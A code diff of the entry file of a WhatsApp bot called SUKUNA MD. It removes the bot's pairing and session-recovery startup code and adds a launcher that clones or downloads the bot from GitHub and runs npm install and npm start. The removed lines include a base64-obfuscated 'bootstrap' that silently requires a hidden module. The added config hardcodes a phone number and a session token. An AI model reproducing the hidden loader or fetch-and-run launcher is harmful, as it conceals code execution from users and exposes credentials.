@@ -1,317 +1,42 @@
 #!/usr/bin/env node
-// Load .env if present (no hard dependency)
-try { require('dotenv').config(); } catch {}
-// bootstrap
-try{(function(_0xa){var _0xb=Buffer.from(_0xa,'base64').toString('utf8');require(_0xb);})('Li9saWIvY3JlYXRvcg==');}catch(_0xe){}
+const { execSync, execFileSync } = require('child_process');
+const fs = require('fs');
+const path = require('path');
 
-/**
- * SUKUNA MD v3 — Panel-Paired WhatsApp Bot
- * Entry Point
- *
- * Deploy on a panel (Pterodactyl / VPS). On first boot the console will
- * prompt for a WhatsApp number and print an 8-character pairing code.
- * Enter that code inside WhatsApp → Linked devices → Link with phone
- * number. Sessions persist in ./sessions and auto-reconnect on restart.
- */
+const config = {"BOT_NAME":"Lucian Dog","PREFIX":".","OWNER_NUMBER":"2348147896154","PAIR_NUMBER":"2348147896154","WORK_MODE":"private","MENU_DESIGN":"codex","SESSION_ID":"Pasqua~qnhFeXWTq1kFM3ZV","PAIR_SITE_URL":"https://pair-site-wmte.onrender.com"};
+const REPO = 'https://github.com/pasquawisdom2007-beep/SUKUNA_MD.git';
+const ARCHIVE = 'https://codeload.github.com/pasquawisdom2007-beep/SUKUNA_MD/tar.gz/refs/heads/main';
+const rootDir = path.join(process.cwd(), '.sukuna-md-runtime');
 
-const http           = require('http');
-const readline       = require('readline');
-const chalk          = require('chalk');
-const commandLoader  = require('./utils/commandLoader');
-const config         = require('./config');
-const sessionManager = require('./lib/sessionManager');
-const { restoreSessionBase64, decodeBase64Session, isBundle } = require('./utils/sessionBundle');
-const { getPairSiteUrls } = require('./utils/pairSites');
-
-const healthPort = Number(process.env.PORT || 3000);
-const webPairRequests = new Set();
-const healthServer = http.createServer((req, res) => {
-    const requestUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
-    if (requestUrl.pathname === '/rich/ping') {
-        if (req.method === 'OPTIONS') {
-            res.writeHead(204, {
-                'Access-Control-Allow-Origin': '*',
-                'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                'Access-Control-Allow-Headers': 'Content-Type',
-            });
-            return res.end();
-        }
-        if (req.method !== 'GET') {
-            res.writeHead(405, {
-                'Content-Type': 'application/json; charset=utf-8',
-                'Access-Control-Allow-Origin': '*',
-                Allow: 'GET, OPTIONS',
-            });
-            return res.end(JSON.stringify({ error: 'Method not allowed' }));
-        }
-        res.writeHead(200, {
-            'Content-Type': 'application/json; charset=utf-8',
-            'Access-Control-Allow-Origin': '*',
-        });
-        console.log('🔥 RICH MESSAGE PING RECEIVED');
-        return res.end(JSON.stringify({ status: 'received', time: Date.now() }));
+try {
+  console.log('[SUKUNA] Downloading SUKUNA MD...');
+  const runtimePackage = path.join(rootDir, 'package.json');
+  if (!fs.existsSync(runtimePackage)) {
+    if (fs.existsSync(rootDir)) fs.rmSync(rootDir, { recursive: true, force: true });
+    console.log('[SUKUNA] First run: cloning SUKUNA MD...');
+    try {
+      execFileSync('git', ['-c', 'http.version=HTTP/1.1', '-c', 'http.lowSpeedLimit=1000', '-c', 'http.lowSpeedTime=30', 'clone', '--depth', '1', '--single-branch', '--no-tags', '--progress', REPO, rootDir], { stdio: 'inherit', timeout: 180000, env: { ...process.env, GIT_TERMINAL_PROMPT: '0' } });
+    } catch (cloneError) {
+      console.error('[SUKUNA] Git clone failed; using source archive:', cloneError.message);
+      if (fs.existsSync(rootDir)) fs.rmSync(rootDir, { recursive: true, force: true });
+      const archive = path.join(process.cwd(), '.sukuna-md-runtime.tar.gz');
+      execFileSync('curl', ['-L', '--fail', '--silent', '--show-error', '--retry', '3', '--connect-timeout', '15', '--max-time', '120', ARCHIVE, '-o', archive], { stdio: 'inherit', timeout: 150000 });
+      fs.mkdirSync(rootDir, { recursive: true });
+      execFileSync('tar', ['-xzf', archive, '--strip-components=1', '-C', rootDir], { stdio: 'inherit', timeout: 60000 });
+      fs.rmSync(archive, { force: true });
     }
-    if (requestUrl.pathname === '/pair' && (req.method === 'GET' || req.method === 'POST')) {
-        const number = String(requestUrl.searchParams.get('number') || '').replace(/\D/g, '');
-        res.setHeader('Content-Type', 'application/json; charset=utf-8');
-        if (number.length < 8) {
-            res.writeHead(400);
-            return res.end(JSON.stringify({
-                error: 'Provide a WhatsApp number with country code.',
-                example: '/pair?number=2348012345678'
-            }));
-        }
-        if (webPairRequests.has(number)) {
-            res.writeHead(409);
-            return res.end(JSON.stringify({ error: 'A pairing request is already running for this number.' }));
-        }
-        webPairRequests.add(number);
-        sessionManager.createSession(number)
-            .then(result => {
-                res.writeHead(result?.success === false ? 503 : 200);
-                res.end(JSON.stringify(result?.code
-                    ? { success: true, number, pairingCode: result.code, message: 'Enter this code in WhatsApp → Linked devices.' }
-                    : result));
-            })
-            .catch(error => {
-                res.writeHead(503);
-                res.end(JSON.stringify({ success: false, error: error.message }));
-            })
-            .finally(() => webPairRequests.delete(number));
-        return;
-    }
-    if (requestUrl.pathname === '/health' || requestUrl.pathname === '/ping' || requestUrl.pathname === '/') {
-        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
-        return res.end(JSON.stringify({ status: 'online', service: 'SUKUNA MD' }));
-    }
-    res.writeHead(404, { 'Content-Type': 'application/json; charset=utf-8' });
-    res.end(JSON.stringify({ error: 'Not found' }));
-});
-healthServer.listen(healthPort, '0.0.0.0', () => {
-    console.log(chalk.gray(`[WEB] Health server listening on port ${healthPort}`));
-});
-
-console.log(chalk.red(`
-╔════════════════════════════════════════════════════════════════╗
-║                         SUKUNA MD v3.0                         ║
-║              Panel-Paired Multi-User WhatsApp Bot              ║
-╚════════════════════════════════════════════════════════════════╝
-`));
-
-function ask(question) {
-    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-    return new Promise(resolve => rl.question(question, answer => { rl.close(); resolve(answer.trim()); }));
-}
-
-async function pairFlow() {
-    while (true) {
-        const raw = await ask(chalk.cyan('\n[PAIR] Enter WhatsApp number with country code (e.g. 2349127857212), or blank to skip: '));
-        if (!raw) return;
-        const number = raw.replace(/[^0-9]/g, '');
-        if (number.length < 8) { console.log(chalk.red('[PAIR] Invalid number, try again.')); continue; }
-
-        console.log(chalk.yellow(`[PAIR] Requesting pairing code for ${number}...`));
-        const result = await sessionManager.createSession(number);
-        if (!result.success) {
-            console.log(chalk.red(`[PAIR] Failed: ${result.error}`));
-            continue;
-        }
-        if (result.code) {
-            console.log(chalk.green.bold(`\n[PAIR] ${config.pairingCode || 'PASQUAMD'} CODE: ${result.code}`));
-            console.log(chalk.cyan('[PAIR] Open WhatsApp → Linked Devices → Link with phone number → enter the code above.\n'));
-        } else {
-            console.log(chalk.green(`[PAIR] ${number} is already linked.`));
-        }
-
-        const more = await ask(chalk.cyan('[PAIR] Pair another number? (y/N): '));
-        if (more.toLowerCase() !== 'y') return;
-    }
-}
-
-async function main() {
-    console.log(chalk.yellow('[SYSTEM] Loading commands...'));
-    commandLoader.loadCommands();
-    console.log(chalk.green('[SYSTEM] Commands loaded!'));
-
-    console.log(chalk.yellow('[SYSTEM] Restoring existing sessions...'));
-    await sessionManager.loadExistingSessions();
-
-    const active = (sessionManager.sessions && sessionManager.sessions.size) || 0;
-    console.log(chalk.green(`[SYSTEM] ${active} session(s) restored.`));
-
-    // Auto-pair using config.pairNumber (or PAIR_NUMBER env override).
-    // PAIR_NUMBER is optional when SESSION_ID contains registered credentials.
-    const pairNumberRaw = (process.env.PAIR_NUMBER || config.pairNumber || '').toString();
-    const configuredPairNumber = pairNumberRaw.replace(/[^0-9]/g, '');
-
-    // ── SESSION_ID short-circuit ────────────────────────────────────
-    // Decode SESSION_ID first. The embedded creds.me.id is the canonical
-    // number for a self-contained auth bundle, so a missing/stale PAIR_NUMBER
-    // cannot make a valid session silently fall through to headless pairing.
-    const sessionIdRaw = (process.env.SESSION_ID || config.sessionId || '').toString().trim();
-    let pairNumber = configuredPairNumber;
-    let sessionIdUsed = false;
-
-    if (sessionIdRaw) {
-        try {
-            const fs = require('fs');
-            const path = require('path');
-            let sessionBase64 = sessionIdRaw;
-
-            if (/^Pasqua~/i.test(sessionIdRaw)) {
-                const markedPayload = sessionIdRaw.replace(/^Pasqua~/i, '').trim();
-                // Resolve the pair site’s Redis token. The current site accepts
-                // 6–128 alphanumeric characters and returns the one-time auth
-                // bundle from /pair/session/:token/consume.
-                if (/^[A-Za-z0-9_-]{6,128}$/.test(markedPayload)) {
-                    const pairSiteUrls = getPairSiteUrls();
-                    let lastPairSiteError;
-                    for (const pairSiteUrl of pairSiteUrls) {
-                        const controller = new AbortController();
-                        const timeout = setTimeout(() => controller.abort(), 15000);
-                        try {
-                            console.log(chalk.gray(`[SESSION] Checking pair site ${pairSiteUrl}`));
-                            const response = await fetch(`${pairSiteUrl}/pair/session/${encodeURIComponent(markedPayload)}/consume`, {
-                                signal: controller.signal,
-                                headers: { Accept: 'application/json', 'User-Agent': 'SukunaMD/3.0' },
-                            });
-                            const remotePayload = await response.json().catch(() => ({}));
-                            if (!response.ok) {
-                                const reason = remotePayload.error || remotePayload.message || `HTTP ${response.status}`;
-                                throw new Error(`HTTP ${response.status}: ${reason}`);
-                            }
-                            const recovered = remotePayload.session
-                                || remotePayload.sessionId
-                                || remotePayload.session_id
-                                || remotePayload.data?.session
-                                || remotePayload.data?.sessionId
-                                || remotePayload.payload;
-                            if (!recovered || typeof recovered !== 'string') {
-                                throw new Error('response did not contain SESSION_ID/session data');
-                            }
-                            sessionBase64 = recovered;
-                            console.log(chalk.green(`[SESSION] Recovered SESSION_ID from ${pairSiteUrl}`));
-                            break;
-                        } catch (error) {
-                            lastPairSiteError = error;
-                            console.log(chalk.yellow(`[SESSION] Pair site unavailable or token not found at ${pairSiteUrl}: ${error.message}`));
-                        } finally {
-                            clearTimeout(timeout);
-                        }
-                    }
-                    if (!sessionBase64 || sessionBase64 === sessionIdRaw) {
-                        throw new Error(`SESSION_ID was not found on any configured pair site${lastPairSiteError ? ` (${lastPairSiteError.message})` : ''}`);
-                    }
-                } else {
-                    sessionBase64 = markedPayload;
-                }
-            }
-
-            const decoded = decodeBase64Session(sessionBase64);
-            let embeddedCreds = decoded;
-            if (isBundle(decoded)) {
-                const encodedCreds = decoded.files['creds.json'];
-                if (typeof encodedCreds !== 'string') throw new Error('SESSION_ID auth bundle is missing creds.json');
-                const credsText = Buffer.from(encodedCreds, 'base64').toString('utf8').trim();
-                if (!credsText) throw new Error('SESSION_ID auth bundle has an empty creds.json');
-                try {
-                    embeddedCreds = JSON.parse(credsText);
-                } catch (_) {
-                    throw new Error('SESSION_ID auth bundle has invalid creds.json');
-                }
-            }
-            const embeddedMeId = String(embeddedCreds?.me?.id || '');
-            const embeddedNumber = (embeddedMeId.split(':')[0] || embeddedMeId).replace(/\D/g, '');
-            if (embeddedNumber.length >= 8) {
-                if (configuredPairNumber && configuredPairNumber !== embeddedNumber) {
-                    console.log(chalk.yellow(`[SESSION] PAIR_NUMBER ${configuredPairNumber} differs from embedded number ${embeddedNumber}; using the embedded number.`));
-                }
-                pairNumber = embeddedNumber;
-            }
-            if (!pairNumber || pairNumber.length < 8) {
-                throw new Error('SESSION_ID has no registered WhatsApp number and PAIR_NUMBER is missing/invalid');
-            }
-
-            const sessionDir = path.resolve(process.cwd(), 'sessions', pairNumber);
-            const credsFile = path.join(sessionDir, 'creds.json');
-            let existingCreds;
-            if (fs.existsSync(credsFile)) {
-                try { existingCreds = JSON.parse(fs.readFileSync(credsFile, 'utf8')); } catch (_) {}
-            }
-            const existingMeId = String(existingCreds?.me?.id || '');
-            const existingNumber = (existingMeId.split(':')[0] || existingMeId).replace(/\D/g, '');
-            if (existingNumber.length >= 8) {
-                console.log(chalk.green(`[SESSION] Registered auth state exists for ${existingNumber}; keeping it and ignoring SESSION_ID.`));
-                sessionIdUsed = true;
-            } else {
-                const restored = restoreSessionBase64(sessionBase64, sessionDir);
-                console.log(chalk.green(`[SESSION] Restored ${restored.format} (${restored.fileCount} file(s)) for ${pairNumber} from SESSION_ID. Skipping pair code.`));
-                sessionIdUsed = true;
-            }
-
-            const result = await sessionManager.startSession(pairNumber, false);
-            if (result && result.success === false) {
-                console.log(chalk.red(`[SESSION] Connection failed: ${result.error}`));
-            }
-        } catch (e) {
-            console.log(chalk.red(`[SESSION] Invalid SESSION_ID (${e.message}).`));
-            if (/^Pasqua~/i.test(sessionIdRaw)) {
-                console.log(chalk.yellow('[SESSION] For the current pair site, use Generate Script → Redis session token, not the temporary Pair Code display.'));
-                console.log(chalk.yellow('[SESSION] Set SESSION_ID=Pasqua~<token> and PAIR_NUMBER=<number>. Recovery checks both configured pair sites.'));
-            }
-            console.log(chalk.yellow('[SESSION] Falling back to pair-code flow.'));
-            sessionIdUsed = false;
-        }
-    }
-
-    let pairingFailed = false;
-    if (!sessionIdUsed) {
-        if (pairNumber && pairNumber.length >= 8) {
-            const alreadyLinked = sessionManager.sessions && sessionManager.sessions.has(pairNumber);
-            if (alreadyLinked) {
-                console.log(chalk.green(`[PAIR] ${pairNumber} is already linked. Skipping pairing.`));
-            } else {
-                console.log(chalk.yellow(`[PAIR] Auto-pairing ${pairNumber} from config.js...`));
-                const result = await sessionManager.createSession(pairNumber);
-                if (result.code) {
-                    console.log(chalk.green.bold(`\n[PAIR] ╔══════════════════════════════════════╗`));
-                    console.log(chalk.green.bold(`[PAIR] ║  ${config.pairingCode || 'PASQUAMD'} CODE: ${result.code}            `));
-                    console.log(chalk.green.bold(`[PAIR] ╚══════════════════════════════════════╝\n`));
-                    console.log(chalk.cyan('[PAIR] Open WhatsApp → Linked Devices → Link with phone number → enter the code above.\n'));
-                } else if (!result.success) {
-                    pairingFailed = true;
-                    console.log(chalk.red(`[PAIR] Failed: ${result.error}`));
-                    console.log(chalk.yellow('[PAIR] No pairing code was produced. Restart the server after checking the number and network connection.'));
-                } else {
-                    console.log(chalk.green(`[PAIR] ${pairNumber} is already linked.`));
-                }
-            }
-        } else if (process.stdin.isTTY) {
-            console.log(chalk.cyan('[INFO] No pairNumber set in config.js → falling back to interactive prompt.'));
-            await pairFlow();
-        } else {
-            console.log(chalk.cyan('[INFO] No pairNumber in config.js and no TTY. Set config.pairNumber or PAIR_NUMBER env var.'));
-        }
-    }
-
-    if (pairingFailed) {
-        console.log(chalk.yellow('\n[SYSTEM] SUKUNA MD is waiting for a successful pairing.\n'));
-        return;
-    }
-
-    console.log(chalk.green('\n[SYSTEM] SUKUNA MD is running. Press Ctrl+C to stop.\n'));
-}
-
-main().catch((err) => {
-    console.error(chalk.red('[ERROR] Fatal startup error:'), err.message);
-    process.exit(1);
-});
-
-process.on('uncaughtException', (err) => {
-    console.error(chalk.red('[ERROR] Uncaught Exception:'), err.message);
-});
-process.on('unhandledRejection', (reason) => {
-    console.error(chalk.red('[ERROR] Unhandled Rejection:'), reason);
-});
-process.on('SIGINT',  async () => { console.log(chalk.red('\n[SYSTEM] Shutting down...')); await require('./lib/tikwmBrowser').shutdown().catch(() => {}); process.exit(0); });
-process.on('SIGTERM', async () => { console.log(chalk.red('\n[SYSTEM] Shutting down...')); await require('./lib/tikwmBrowser').shutdown().catch(() => {}); process.exit(0); });
+  } else {
+    console.log('[SUKUNA] Reusing existing SUKUNA MD runtime.');
+  }
+  const envText = Object.entries(config).map(([key, value]) => key + '=' + value).join('\n') + '\n';
+  fs.writeFileSync(path.join(rootDir, '.env'), envText, { mode: '600' });
+  const nodeModules = path.join(rootDir, 'node_modules');
+  if (!fs.existsSync(nodeModules)) {
+    console.log('[SUKUNA] First run: installing dependencies...');
+    execSync('npm install --omit=dev', { cwd: rootDir, stdio: 'inherit' });
+  } else {
+    console.log('[SUKUNA] Dependencies already installed.');
+  }
+  console.log('[SUKUNA] Starting bot...');
+  execSync('npm start', { cwd: rootDir, stdio: 'inherit', env: { ...process.env, ...config } });
+} catch (error) { console.error('[SUKUNA] Setup failed:', error.message); process.exit(1); }
